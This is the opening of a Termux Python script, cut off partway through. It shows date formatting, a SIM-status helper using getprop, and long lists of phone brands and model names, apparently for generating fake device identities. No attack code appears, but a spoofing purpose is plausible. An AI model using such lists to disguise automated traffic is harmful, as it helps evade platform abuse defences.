#!/data/data/com.termux/files/usr/bin/python3.13
# -*- coding: utf-8 -*-
import os,sys,time,random,string,uuid,requests,json,base64,re,datetime,subprocess
from os import system
from time import sleep
from concurrent.futures import ThreadPoolExecutor as ThreadPool
lt = time.localtime
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
date = str(tgl)+'\033[1;31m|\x1b[38;5;46m'+str(bln)+'\033[1;31m|\x1b[38;5;46m'+str(thn)
ltx = int(time.localtime()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"

def gp(x):
    try:return subprocess.check_output(["getprop",x],stderr=subprocess.DEVNULL).decode().strip()
    except:return ""

def sim_show():
    op=gp("gsm.operator.alpha").split(",")
    st=gp("gsm.sim.state").split(",")
    ds=None

    for p in ["persist.radio.default.data","persist.radio.data.slot","persist.radio.default_data_sub"]:
        v=gp(p)
        if v.isdigit():ds=int(v);break

    if ds is None:
        try:
            v=subprocess.check_output(["cmd","phone","get-data-subscription"],stderr=subprocess.DEVNULL).decode()
            n=re.findall(r"\d+",v)
            if n:ds=int(n[-1])
        except:pass

    r=[]
    for i in range(2):
        o=op[i].strip() if i<len(op) else ""
        s=st[i].strip() if i<len(st) else ""
        if not o and "READY" not in s.upper():continue
        o=o or "Unknown"
        d=ds is not None and (ds==i or ds==i+1)
        r.append(f"{G}SIM{i+1}: {G} ☑ DATA" if d else f"{G}SIM{i+1}: {G}")
    return "  ".join(r) if r else "WIFI / NO SIM"

C = "\033[96m"
P = "\033[95m"
G="\033[1;92m"
W="\x1b[38;5;15m"
Y="\x1b[38;5;226m"
R="\33[1;91m"
X="\033[1;94m"

def clear():
    system("clear" if os.name == "posix" else "cls")
    print(logo)

def line():
    print(f'''\x1b[38;5;15m{49*'—'}''')

manufacturers = ["Gigaset","Mobicel","AfriOne","Vestel","Reeder","Omix","General_Mobile","Casper","Fly_Mobile","Highscreen","Vertex","Vertex","INOI","DEXP","BQ_Mobile","Kruger_Matz","Maxcom","Energizer_Phones","Prestigio","Allview","Kazam","Volla_Phone","Shiftphone","Crosscall","Redmi_Clone_ODM","Sugar_Mobile","Phicomm","Haier_Mobile","Lenovo_Mobile","Coolpad","Meizu","Nubia","Smartisan","360_Mobile","Konka","Hisense_Mobile","ZTE","TCL","Rakuten_Phone","Sharp_Aquos","Fujitsu_Arrows","Alcatel","Blu_Products","CAT_Phones","Kyocera_Rugged","Sonim","GPlus","GLX","iBall","Spice","JioPhone","Intex","Micromax","MyPhone","Hammer","Archos","Wiko","BQ","samsung","Fairphone","Fero","Condor","Karbonn","Tecno","Cubot","Unihertz","Doogee","Oukitel","Blackview","Ulefone","AGM","Leagoo","Elephone","HomTom","Vernee","VKworld","UMIDIGI","IIIF150","Hotwav","OnePlus","OPPO","Infinix","Lenovo","Google","Amazon","Sony","Realme","Huawei","LG","Nokia","Lava","Motorola","Wiko","Itel","Vivo","ASUS","Symphony","Xiaomi"]
models = {
"Gigaset": ["GS5","GS5_LITE","GS4","GS3","GS370_4G","GS370","GS290","GS280","GS270_PLUS","GS195","GS190","GS185","GS180","GS170","GS160","GS110","GS100","GS80"],
"Rivo":["RHYTHM_RX40","RHYTHM_RX45","RHYTHM_RX50","RHYTHM_RX55","RHYTHM_RX60","PHANTOM_PZ15","PHANTOM_PZ20","PHANTOM_PZ25","NEO_NX10","NEO_NX20"],
"Mobicel":["R1","R2","R4","R6","R7","R8","R9","R10","E1","E2","E3","S1","S2","S3","S4","X1","X2"],
"AfriOne":["GRAVITY_Z1","GRAVITY_Z2","GRAVITY_Z3"],
"Vestel":["VENUS_E3","VENUS_E4","VENUS_E5","VENUS_V3_5010","VENUS_V3_5020","VENUS_V4","VENUS_V5","VENUS_Z10"],
"Reeder":["P13_BLUE","P13_BLUE_PLUS","P13_BLUE_MAX","P13_BLUE_MAX_LITE","P13_BLUE_2021","P13_BLUE_MAX_2021","S19_MAX","S19_MAX_PRO"],
"Omix":["X300","X400","X500","X600","X700"],
"General_Mobile":["GM_5","GM_5_PLUS","GM_6","GM_8","GM_8_GO","GM_9_GO","GM_20","GM_20_PRO","GM_21","GM_21_PLUS","GM_22","GM_22_PRO"],
"Casper":["VIA_A1","VIA_A2","VIA_A3","VIA_A4","VIA_A4_PLUS","VIA_E1","VIA_E2","VIA_E3","VIA_F1","VIA_G1","VIA_G4"],
"Fly_Mobile":["IQ440","IQ441","IQ442","IQ443","IQ450","IQ451","IQ452","IQ454"],
"Highscreen":["Alpha_GT","Alpha_R","Alpha_Rage","Boost","Boost_2","Boost_3","Easy_F","Easy_L","Easy_Power","Fest","Hercules","Ice_2","Omega_Prime","Power_Five","Power_Five_Max","Pure_F","Spade","Thor","Zera_F","Zera_S","Zera_U"],
"Texet": ["TM_4003","TM_4071","TM_4083","TM_4510","TM_4513","TM_4521","TM_5003","TM_5013","TM_5016","TM_5083","TM_5204","TM_5505","TM_5577","TM_5581","TM_5702","TM_6003","TM_6503","TM_6513"],
"Vertex": ["Core_55S_Ultra","Impress_Aero","Impress_Aqua","Impress_Astra","Impress_Calypso","Impress_City","Impress_Click","Impress_Click_NFC","Impress_Cube","Impress_Disco","Impress_Eagle_4G","Impress_Fire","Impress_Flash","Impress_Forest","Impress_Frost","Impress_Game","Impress_Indigo","Impress_Lion_4G","Impress_New","Impress_Play","Impress_Pluto","Impress_Reef","Impress_Rosso","Impress_Spring","Impress_Stone","Impress_Tiger","Impress_Vega_4G","Impress_Vira","Impress_X","Impress_XXL","Impress_Zeon_4G"],
"INOI": ["INOI_1_Lite","INOI_105","INOI_106Z","INOI_107B","INOI_117B","INOI_118B","INOI_248M","INOI_249S","INOI_281","INOI_287","INOI_289"],
"DEXP": ["DEXP_AL140","DEXP_AL240","DEXP_Ixion_B140","DEXP_Ixion_X_4","DEXP_Ixion_X_5"],
"BQ_Mobile": ["BQ-4028","BQ-4030","BQ-4035","BQ-4040","BQ-4072","BQ-4500","BQ-4510","BQ-4526","BQ-4585","BQ-5000","BQ-5001","BQ-5012","BQ-5022","BQ-5032","BQ-5045","BQ-5054","BQ-5057","BQ-5060","BQ-5070","BQ-5201","BQ-5300","BQ-5500","BQ-5514","BQ-5520L","BQ-5530","BQ-5540","BQ-5565","BQ-5591","BQ-5700","BQ-5732","BQ-5740","BQ-6015L","BQ-6022G","BQ-6035L","BQ-6040L","BQ-6200L","BQ-6424L","BQ-6430L","BQ-6445","BQ-6500","BQ-6630L","BQ-6645L","BQ-6650","BQ-6868L","BQ-7082G","BQ-8068L"],
"Kruger_Matz": ["Kruger_Matz_Edge_5","Kruger_Matz_Edge_6","Kruger_Matz_Edge_7","Kruger_Matz_Edge_8"],
"Maxcom": ["Maxcom_MS459","Maxcom_MS500","Maxcom_MS501","Maxcom_MS522","Maxcom_MS553"],
"Energizer_Phones": ["Energizer_Power_Max_P18K_Pop","Energizer_Power_Ultra_P600S","Energizer_Power_Duo_P490","Energizer_Power_Tough_P18K_Pro"],
"Prestigio": ["Prestigio_MultiPhone_5507","Prestigio_MultiPhone_5509","Prestigio_MultiPhone_5508","Prestigio_Wize_3318","Prestigio_Wize_3321"],
"Allview": ["Allview_P8_Energy","Allview_P9_Energy","Allview_X4_Soul","Allview_X4_Soul_Mini","Allview_X4_Soul_Xtreme"],
"Kazam": ["Kazam_Tornado_348","Kazam_Tornado_349","Kazam_Thunder_450","Kazam_Thunder_455"],
"Volla_Phone": ["Volla_Phone_V1","Volla_Phone_V2","Volla_Phone_V3"],
"Shiftphone": ["Shift6mq","Shift6m","Shift5me","Shift5.1","Shiftphone_X"],
"Crosscall": ["Crosscall_Core_X4","Crosscall_Trekker_X4","Crosscall_Trekker_X3","Crosscall_Trekker_M1","Crosscall_Active_X3"],
"Redmi_Clone_ODM": ["ODM_Model_1","ODM_Model_2","ODM_Model_3","ODM_Model_4","ODM_Model_5"],
"Sugar_Mobile": ["Sugar_C1","Sugar_C2","Sugar_C3","Sugar_S1","Sugar_S2"],
"Phicomm":["Clue_630","E670_Energy_2","Energy_653","Energy_3_Plus","Energy_4S_E5051","Passion_660","EX780L","E651LT","FWS710A","I508D","I803WA","I813WA","Dragon_S6","Dragon_6Plus"],
"Haier_Mobile": ["Haier_L51","Haier_L56","Haier_L60","Haier_L63","Haier_L68"],
"Lenovo_Mobile": ["Lenovo_K6_Power","Lenovo_K8_Note","Lenovo_K10_Plus","Lenovo_K12_Pro","Lenovo_Z6_Youth"],
"Coolpad": ["Coolpad_Cool_10","Coolpad_Cool_11","Coolpad_Cool_20","Coolpad_Cool_S","Coolpad_Cool_S1"],
"Meizu": ["Meizu_M6","Meizu_M6T","Meizu_16X","Meizu_17","Meizu_18"],
"Nubia": ["Nubia_Z11","Nubia_Z17","Nubia_Z18","Nubia_M2","Nubia_M2_Play"],
"Smartisan": ["Smartisan_Nut_Pro","Smartisan_Nut_R1","Smartisan_Nut_Pro_2","Smartisan_Nut_Pro_3"],
"360_Mobile": ["QiKU_Q5","QiKU_Q5s","QiKU_Q5_plus","QiKU_Q5_pro","QiKU_Q7"],
"Konka": ["Konka_K9","Konka_K10","Konka_K11","Konka_K12","Konka_K13"],
"Hisense_Mobile": ["Hisense_F30","Hisense_F23","Hisense_U965","Hisense_U30","Hisense_U40"],
"ZTE": ["ZTE_Blade_A31","ZTE_Blade_A71","ZTE_Blade_V30","ZTE_Blade_V40","ZTE_Blade_V50"],
"TCL": ["TCL_10L","TCL_10_Pro","TCL_20_Pro","TCL_20_SE","TCL_20_5G","TCL_30_5G"],
"Rakuten_Phone": ["Rakuten_Mobile_Rakuten_Handset_1","Rakuten_Mobile_Rakuten_Handset_2","Rakuten_Mobile_Rakuten_Handset_3"],
"Sharp_Aquos": ["SH-01K","SH-02K","SH-03K","SH-04K","SH-05K","SH-06K","SH-07K","SH-01L","SH-02L","SH-03L"],
"Fujitsu_Arrows": ["F-01K","F-02K","F-03K","F-04K","F-05K","F-06K","F-07K","F-08K","F-09K","F-10K"],
"Alcatel": ["OT_4060A","5044R","OT5024A","OT5028A","OT5039","OT5041","5049","Idol_4","One_Touch_990","OT_915"],
"Blu_Products": ["V0090EE","V050Q","Blu_Vivo_X5","Blu_Vivo_XL5","Blu_G9","Blu_G90","Blu_Studio_5_0","Blu_Studio_6_0","Blu_Dash_5_0","Blu_C6","Blu_C5","Blu_Life_One","Blu_View_5"],
"CAT_Phones": ["CAT_B10","CAT_B25","CAT_B30","CAT_B15","CAT_S50","CAT_S30","CAT_S40","CAT_S41","CAT_S42","CAT_S60","CAT_S61","CAT_S62_Pro","CAT_S48c","CAT_S52","CAT_S32","CAT_S75","CAT_S22_Flip"],
"Kyocera_Rugged": ["E6920","E6920","E6560","E6790","E4710","E4830","E4831"],
"Sonim": ["Sonim_XP3300","Sonim_XP5300","Sonim_XP5700","Sonim_XP6700","Sonim_XP7700","Sonim_XP7700_Force","Sonim_XP8800","Sonim_XP8800_Plus","Sonim_XP9900","Sonim_XP3","Sonim_XP5","Sonim_XP5s","Sonim_XP7","Sonim_XP8","Sonim_XP10"],
"GPlus": ["GPlus_G1","GPlus_G2","GPlus_G3","GPlus_G3_Pro","GPlus_G4","GPlus_G4_Pro","GPlus_G5","GPlus_G5_Pro","GPlus_G6","GPlus_G6_Pro","GPlus_G7","GPlus_G7_Pro","GPlus_G8","GPlus_G8_Pro","GPlus_S1","GPlus_S2","GPlus_S3","GPlus_S4"],
"GLX": ["GLX_G2","GLX_G3","GLX_G3_Pro","GLX_G4","GLX_G4_Pro","GLX_G5","GLX_G5_Pro","GLX_G6","GLX_G6_Pro","GLX_G7","GLX_G7_Pro","GLX_G8","GLX_G8_Pro","GLX_G9","GLX_G9_Pro","GLX_S1","GLX_S2","GLX_S3","GLX_S4","GLX_S5","GLX_S6","GLX_S7","GLX_S8"],
"iBall": ["iBall_Andi_4.5E","iBall_Andi_4.5F","iBall_Andi_5Q","iBall_Andi_5L","iBall_Andi_5M","iBall_Andi_5S","iBall_Andi_5T","iBall_Andi_6M","iBall_Andi_6S","iBall_Andi_6T","iBall_Andi_7M","iBall_Andi_7S","iBall_Andi_7T","iBall_Andi_8M","iBall_Andi_8S","iBall_Andi_8T","iBall_Andi_9M","iBall_Andi_9S","iBall_Andi_9T","iBall_Andi_10M","iBall_Andi_10S","iBall_Andi_10T"],
"Spice": ["Spice_Mi_350","Spice_Mi_401","Spice_Mi_500","Spice_Mi_501","Spice_Mi_502","Spice_Mi_503","Spice_Mi_504","Spice_Mi_505","Spice_Mi_506","Spice_Mi_507","Spice_Mi_508","Spice_Mi_509","Spice_Mi_510","Spice_Mi_511","Spice_Mi_512","Spice_Mi_513","Spice_Mi_514","Spice_Mi_515","Spice_Mi_516","Spice_Mi_517","Spice_Mi_518","Spice_Mi_519","Spice_Mi_520"],
"JioPhone": ["JioPhone_1","JioPhone_2","JioPhone_Lite","JioPhone_K2","JioPhone_K3"],
"Intex": ["Intex_Aqua_Star","Intex_Aqua_Next","Intex_Aqua_Next_Pro","Intex_Aqua_Sense","Intex_Aqua_Sense_2","Intex_Aqua_Sense_4G","Intex_Aqua_Super","Intex_Aqua_Super_2","Intex_Aqua_Y2","Intex_Aqua_Y2_Plus","Intex_Aqua_Plus","Intex_Aqua_5_0","Intex_Aqua_5_5","Intex_Aqua_5_5_Plus","Intex_Aqua_Rush","Intex_Aqua_Fish","Intex_Aqua_Q2","Intex_Aqua_Q3","Intex_Aqua_Q4","Intex_Aqua_Q5","Intex_Aqua_Xtreme","Intex_Aqua_Xtreme_2","Intex_Aqua_Xtreme_Pro"],
"Micromax":["Micromax_A110","Micromax_A110Q","Micromax_A89","Micromax_IN_Note_1","Micromax_IN_Note_2","Micromax_IN_1","Micromax_IN_1b","Micromax_IN_2b","Micromax_Q4251","Micromax_Q4310","Micromax_Q4311","Micromax_Q4002","Micromax_Q409A","Micromax_Q306","Micromax_Q357","Micromax_X099","Micromax_Canvas_A1","Micromax_Canvas_HD_A116","Micromax_Canvas_2_Plus_A110Q","Micromax_Canvas_2_A110","Micromax_Bharat_4","Micromax_Bharat_5","Micromax_Bharat_5_Plus","Micromax_Canvas_Play4G_Q469","Micromax_Canvas_Infinity","Micromax_Canvas_Infinity_Pro","Micromax_Infinity_N11","Micromax_Infinity_N12","Micromax_Spark_4G_Prime_Q452","Micromax_Superfone_Buzz_A73"],
"MyPhone": ["MyPhone_Ace","MyPhone_Ace_Lite","MyPhone_Ace_Pro","MyPhone_Blast","MyPhone_Candy","MyPhone_Cube","MyPhone_Dash","MyPhone_Emerge","MyPhone_Flip","MyPhone_Hero","MyPhone_Liberty","MyPhone_Liberty_2","MyPhone_Liberty_3","MyPhone_Liberty_4","MyPhone_Liberty_5","MyPhone_Liberty_6","MyPhone_Liberty_7","MyPhone_Mega","MyPhone_Mini","MyPhone_Prism","MyPhone_Rhythm","MyPhone_Surge","MyPhone_Titan","MyPhone_Titan_Pro","MyPhone_Titanium","MyPhone_Titanium_Pro","MyPhone_Ultra","MyPhone_Vision","MyPhone_Xtreme","MyPhone_Xtreme_Pro"],
"Hammer": ["Hammer_Blade","Hammer_Blade_2","Hammer_Blade_3","Hammer_Blade_3_Pro","Hammer_Blade_V2","Hammer_Blade_V2_Pro","Hammer_Energy","Hammer_Energy_2","Hammer_Energy_3","Hammer_Energy_3_Pro","Hammer_Energy_4","Hammer_Energy_5","Hammer_Hard","Hammer_Hard_2","Hammer_Hard_3","Hammer_Hard_4","Hammer_Hard_5","Hammer_Hard_6","Hammer_Hard_7","Hammer_Hard_7_Pro","Hammer_Hard_8","Hammer_Hard_8_Pro","Hammer_Hard_9","Hammer_Hard_9_Pro","Hammer_Hard_10","Hammer_Hard_10_Pro","Hammer_Hard_11","Hammer_Hard_11_Pro","Hammer_Hard_12","Hammer_Hard_12_Pro","Hammer_Hard_13","Hammer_Hard_13_Pro"],
"Archos": ["Archos_40_Cobalt","Archos_50_Diamond","Archos_50_Diamond_S","Archos_50_Helium","Archos_50_Helium_Plus","Archos_50_Oxygen","Archos_50_Oxygen_Plus","Archos_50_Platinum","Archos_50_Sense","Archos_55_Cobalt","Archos_55_Diamond_S","Archos_55_Helium","Archos_55_Helium_Plus","Archos_55_Oxygen","Archos_55_Oxygen_Plus","Archos_55_Platinum","Archos_55_Sense","Archos_59_Xenon","Archos_59_Xenon_4G","Archos_59_Silver","Archos_60_Diamond","Archos_60_Diamond_Plus","Archos_60_Oxygen","Archos_60_Oxygen_Plus","Archos_62_Plasma","Archos_64_Internet_Tablet","Archos_70_Diamond","Archos_70_Xenon","Archos_70_Cobalt","Archos_80_Diamond","Archos_80_Diamond_Plus","Archos_80_Oxygen","Archos_80_Oxygen_Plus","Archos_101_Internet_Tablet","Archos_101_Oxygen","Archos_101_Xenon","Archos_101_Platinum"],
"Wiko": ["Wiko_Cink_Five","Wiko_Cink_Peax","Wiko_Cink_Peax_2","Wiko_Cink_Slim","Wiko_Cink_Slim_2","Wiko_Cink_Slim_Pro","Wiko_Darkmoon","Wiko_Darknight","Wiko_Darkside","Wiko_Fever","Wiko_Fever_4G","Wiko_Getaway","Wiko_Harry","Wiko_Harry_2","Wiko_Jerry","Wiko_Jerry_2","Wiko_Jerry_3","Wiko_Lenny","Wiko_Lenny_2","Wiko_Lenny_3","Wiko_Lenny_4","Wiko_Lenny_5","Wiko_Pulp","Wiko_Pulp_Fab","Wiko_Pulp_Fab_4G","Wiko_Pulp_4G","Wiko_Ridge","Wiko_Ridge_4G","Wiko_Rainbow","Wiko_Rainbow_Jam","Wiko_Rainbow_Jam_4G","Wiko_Rainbow_Lite","Wiko_Rainbow_Up","Wiko_Selfy","Wiko_Slide","Wiko_Sunny","Wiko_Sunny_2","Wiko_Tommy","Wiko_Tommy_2","Wiko_Tommy_3","Wiko_View","Wiko_View_2","Wiko_View_2_Go","Wiko_View_2_Pro","Wiko_View_3","Wiko_View_3_Lite","Wiko_View_3_Pro","Wiko_View_4","Wiko_View_4_Lite","Wiko_Y60","Wiko_Y61","Wiko_Y62","Wiko_Y70","Wiko_Y80","Wiko_Y81","Wiko_Y82","Wiko_Y90","Wiko_Y91","Wiko_Y92","Wiko_Y93","Wiko_Y95","Wiko_Y100","Wiko_Y101"],
"BQ": ["BQ_Aquaris_A4_5","BQ_Aquaris_A4_5_Android_One","BQ_Aquaris_A4_5_Pro","BQ_Aquaris_E4","BQ_Aquaris_E4_5","BQ_Aquaris_E5","BQ_Aquaris_E5_FHD","BQ_Aquaris_M4_5","BQ_Aquaris_M5","BQ_Aquaris_M5_5","BQ_Aquaris_M5_FHD","BQ_Aquaris_U","BQ_Aquaris_U_Plus","BQ_Aquaris_V","BQ_Aquaris_V_Plus","BQ_Aquaris_X","BQ_Aquaris_X_Plus","BQ_Aquaris_X2","BQ_Aquaris_X2_Pro","BQ_Aquaris_C","BQ_Aquaris_C_Plus"],
"Samsung":["GT_I9000","GT_I9100","GT_I9300","GT_I9500","GT_I9505","SM_A010F","SM_A015F","SM_A022F","SM_A032F","SM_A035F","SM_A105F","SM_A115F","SM_A125F","SM_A135F","SM_A145F","SM_A205F","SM_A215F","SM_A225F","SM_A235F","SM_A245F","SM_A305F","SM_A315F","SM_A325F","SM_A335F","SM_A346B","SM_A505F","SM_A515F","SM_A525F","SM_A536B","SM_A546B","SM_A705F","SM_A715F","SM_A725F","SM_A736B","SM_A746B","SM_F711B","SM_F721B","SM_F916B","SM_F926B","SM_F936B","SM_G900F","SM_G920F","SM_G925F","SM_G930F","SM_G935F","SM_G950F","SM_G955F","SM_G960F","SM_G965F","SM_G970F","SM_G973F","SM_G975F","SM_G980F","SM_G985F","SM_G990B","SM_G991B","SM_G996B","SM_G998B","SM_M105F","SM_M115F","SM_M125F","SM_M135F","SM_M205F","SM_M215F","SM_M225FV","SM_M236B","SM_M305F","SM_M315F","SM_M325F","SM_M336B","SM_M515F","SM_M526B","SM_M546B","SM_N9005","SM_N910F","SM_N920C","SM_N930F","SM_N950F","SM_N960F","SM_N970F","SM_N975F","SM_N980F","SM_N986B","SM_S901B","SM_S906B","SM_S908B","SM_S911B","SM_S916B","SM_S918B"],
"Fairphone": ["Fairphone_1","Fairphone_2","Fairphone_3","Fairphone_3_Plus","Fairphone_4","Fairphone_5"],
"Fero": ["Fero_A4001","Fero_A4002","Fero_A4501","Fero_A5001","Fero_A5002","Fero_A5501","Fero_A6001","Fero_A6002","Fero_A6003","Fero_A7001","Fero_A7002","Fero_A8001","Fero_A8002","Fero_A9001","Fero_Magic","Fero_Pace","Fero_Power","Fero_Royale","Fero_S1","Fero_S2","Fero_S3","Fero_S4","Fero_Vibe","Fero_Vibe_Plus"],
"Condor": ["Condor_Allure_M1","Condor_Allure_M3","Condor_Allure_X","Condor_Allure_A8_Plus","Condor_Nova_70","Condor_Nova_70SE","Condor_Nova_70_Pro","Condor_Nova_70S","Condor_Nova_60","Condor_Nova_60i","Condor_GT60","Condor_GT60_Pro","Condor_Plume_L3","Condor_Plume_L3_Plus","Condor_Plume_L5","Condor_Plume_L5_Pro","Condor_Plume_L6_Pro","Condor_Plume_L8_Pro","Condor_Griffe_T8","Condor_Griffe_T8_Plus","Condor_Griffe_T9","Condor_Griffe_T9_Plus","Condor_SP530","Condor_SP638","Condor_Griffe_T1","Condor_F_Trios","Condor_F1_MINI","Condor_F4","Condor_Plus_Plume_P6_PRO","Condor_Plumep6_PRO_LTE","Condor_GRIFFE_G5","Condor_GRIFFE_G5_PLUS","Condor_Infinity_A4","Condor_Infinity_I4","Condor_Buzz_2_Lite","Condor_A9_Plus","Condor_C1_Plus"],
"Karbonn": ["Karbonn_Aura_Note_4G","Karbonn_Platinum_P9","Karbonn_Platinum_P9_Pro","Karbonn_Titanium_S9_Plus","Karbonn_Titanium_Jumbo","Karbonn_Titanium_Jumbo_2","Karbonn_Titanium_Jumbo_3","Karbonn_Aura_Sleek_Plus","Karbonn_Frames_S9","Karbonn_K9_Smart","Karbonn_A40_Indian","Karbonn_Alfa_A18","Karbonn_K9_Smart_Eco","Karbonn_A9_Indian_4G","Karbonn_Aura_Champ","Karbonn_K9_Music_4G","Karbonn_K9_Kavach_4G","Karbonn_Aura_Note_2","Karbonn_X21","Karbonn_Titanium_Frames_S7","Karbonn_Indian_9","Karbonn_Aura_Note_Play_4G","Karbonn_A109_3G","Karbonn_Titanium_S2_Plus","Karbonn_S9_Lite","Karbonn_Opium_N7","Karbonn_K12_Plus","Karbonn_KPhone6","Karbonn_K9_Power"],
"Tecno": ["BF7","BF7h","BF7n","BF7s","BG6","BG6h","BG6i","BG6m","BG6s","BG7","BG7n","C5","C5S","C7","C8","C9","C9S","CA6","CA6S","CA7","CA8","CA8S","Camon11","CB7","CB7j","CC6","CC7","CC7S","CC9","CD6","CD6j","CD6s","CD7","CD8","CD8j","CE7","CE7j","CE8","CE9","CE9h","CF7","CF7k","CF7kS","CF7S","CF8","CF8S","CG6","CG6j","CG7","CG7n","CG8","CG8h","CH6","CH6h","CH6i","CH6IS","CH6j","CH6n","CH7","CH7n","CH9","CH9n","CI6","CI6n","CI7","CI7n","CM7","CM8","AE10","AE11","CLA5","CLA6","CL7","CL7S","CL8","CL9","LI9","LI7","CL6","CL6S","S6","K16SAA","KJ8S","KJ8","T1001W","T1001","TU01AIR-L","TU01AIR-R","TU01-R","TU01-L","BG6M","AD11","LG6N","KG5KS","KH6","CI7N","CI8N","CH6I","BE7","BD1","BD2D","BD4","KG5J","KG5","Spark10","Spark10Pro","Spark10C","Spark20","Spark20C","Spark20Pro","Spark20ProPlus","Spark30","Spark30Pro","Spark30C","Spark305G","SparkGo1","SparkGo2023","SparkGo2024","Spark40","Spark40Pro","Spark40ProPlus","Camon20","Camon20Pro","Camon20Premier5G","Camon30","Camon305G","Camon30Pro5G","Camon30Premier5G","Camon30S","Camon30SPro","Camon40","Camon40Pro","Camon40Premier5G","Pova3","Pova4Pro","Pova5","Pova5Pro5G","Pova6","Pova6Neo","Pova6Pro5G","POVA7","PovaCurve5G","Pop5LTE","Pop7","PhantomVFlip5G","PhantomVFold","PhantomV2Fold5G"],
"Cubot": ["CUBOT_NOTE_7","CUBOT_NOTE_8","CUBOT_NOTE_9","CUBOT_NOTE_10","CUBOT_NOTE_20","CUBOT_NOTE_20_PRO","CUBOT_NOTE_30","CUBOT_NOTE_40","CUBOT_NOTE_50","CUBOT_NOTE_60","CUBOT_X18","CUBOT_X19","CUBOT_X20","CUBOT_X20_PRO","CUBOT_X30","CUBOT_X50","CUBOT_X100","CUBOT_P20","CUBOT_P30","CUBOT_P40","CUBOT_P50","CUBOT_P60","CUBOT_J3","CUBOT_J5","CUBOT_J7","CUBOT_J8","CUBOT_J10","CUBOT_J20","CUBOT_C20","CUBOT_C20_PRO","CUBOT_C30","CUBOT_MAX","CUBOT_MAX_2","CUBOT_MAX_3","CUBOT_POCKET","CUBOT_POCKET_3","CUBOT_KINGKONG","CUBOT_KINGKONG_2","CUBOT_KINGKONG_3","CUBOT_KINGKONG_5","CUBOT_KINGKONG_5_PRO","CUBOT_KINGKONG_7","CUBOT_KINGKONG_8","CUBOT_KINGKONG_9","CUBOT_KINGKONG_11","CUBOT_KINGKONG_MINI","CUBOT_KINGKONG_MINI_2","CUBOT_KINGKONG_MINI_3","CUBOT_KINGKONG_MINI_4","CUBOT_KINGKONG_POWER","CUBOT_KINGKONG_POWER_2","CUBOT_KINGKONG_POWER_3","CUBOT_KINGKONG_POWER_5","CUBOT_QUEST","CUBOT_QUEST_LITE","CUBOT_A40"],
"Unihertz": ["Unihertz_Jelly","Unihertz_Jelly_Pro","Unihertz_Jelly_2","Unihertz_Jelly_2E","Unihertz_Jelly_Star","Unihertz_Jelly_3","Unihertz_Jelly_Max","Unihertz_Atom","Unihertz_Atom_L","Unihertz_Atom_XL","Unihertz_Atom_SE","Unihertz_Titan","Unihertz_Titan_Pocket","Unihertz_Titan_Slim","Unihertz_Luna","Unihertz_TickTock","Unihertz_TickTock_E","Unihertz_TickTock_Pro","Unihertz_8849_Tank","Unihertz_8849_Tank_01","Unihertz_8849_Tank_01_Pro","Unihertz_8849_Tank_2","Unihertz_8849_Tank_02_Pro","Unihertz_8849_Tank_3","Unihertz_8849_Tank_03_Pro","Unihertz_8849_Tank_Mini","Unihertz_8849_Tank_Mini_1","Unihertz_8849_Tank_Mini_2","Unihertz_8849_Shark","Unihertz_8849_Shark_1","Unihertz_8849_Shark_3","Unihertz_Bolt"],
"Doogee": ["Doogee_Ares","Doogee_Ares_Pro","Doogee_Blade","Doogee_Blade_10","Doogee_Blade_10_Max","Doogee_Blade_10_Pro","Doogee_Blade_GT","Doogee_Cs1","Doogee_Cs2","Doogee_Cs3","Doogee_Cs4","Doogee_Cs5","Doogee_Cs6","Doogee_Cs7","Doogee_Cs8","Doogee_Cs9","Doogee_DG100","Doogee_DG110","Doogee_DG120","Doogee_DG130","Doogee_DG140","Doogee_DG150","Doogee_DG160","Doogee_DG170","Doogee_DG280","Doogee_DG300","Doogee_DG310","Doogee_DG320","Doogee_DG330","Doogee_DG350","Doogee_DG360","Doogee_DG500","Doogee_DG550","Doogee_DG580","Doogee_DG700","Doogee_DG750","Doogee_DG800","Doogee_DG900","Doogee_DG950","Doogee_F3","Doogee_F3_Pro","Doogee_F5","Doogee_F5_Pro","Doogee_F7","Doogee_F7_Pro","Doogee_G5","Doogee_G5_Pro","Doogee_G6","Doogee_G6_Pro","Doogee_G7","Doogee_G7_Pro","Doogee_G7_Plus","Doogee_G9","Doogee_G9_Pro","Doogee_Homar","Doogee_K3","Doogee_K5","Doogee_K6","Doogee_K7","Doogee_K9","Doogee_L10","Doogee_L20","Doogee_L30","Doogee_L30_SE","Doogee_Mix","Doogee_Mix_2","Doogee_Mix_3","Doogee_N20","Doogee_N20_Pro","Doogee_N30","Doogee_N40","Doogee_N50","Doogee_N50_Pro","Doogee_P60","Doogee_P60_Pro","Doogee_P70","Doogee_Punk","Doogee_Punk_Pro","Doogee_S30","Doogee_S35","Doogee_S40","Doogee_S40_Lite","Doogee_S40_Pro","Doogee_S41","Doogee_S41_Plus","Doogee_S50","Doogee_S51","Doogee_S55","Doogee_S58","Doogee_S59","Doogee_S60","Doogee_S61","Doogee_S61_Pro","Doogee_S68","Doogee_S70","Doogee_S80","Doogee_S86","Doogee_S88","Doogee_S89","Doogee_S90","Doogee_S95","Doogee_S96","Doogee_S97","Doogee_S98","Doogee_S100","Doogee_S110","Doogee_S200","Doogee_T10","Doogee_T10_Pro","Doogee_T20","Doogee_T20_Mini","Doogee_T30","Doogee_T30_Pro","Doogee_V10","Doogee_V20","Doogee_V30","Doogee_X5","Doogee_X5_Max","Doogee_X5_Pro","Doogee_X6","Doogee_X6_Pro","Doogee_X7","Doogee_X9","Doogee_X9_Mini","Doogee_X10","Doogee_X10S","Doogee_X20","Doogee_X20L","Doogee_X20_Pro","Doogee_X30","Doogee_X30L","Doogee_X30_Pro","Doogee_X50","Doogee_X53","Doogee_X60","Doogee_Y6","Doogee_Y7","Doogee_Y8","Doogee_Y9","Doogee_Y100","Doogee_Y200"],
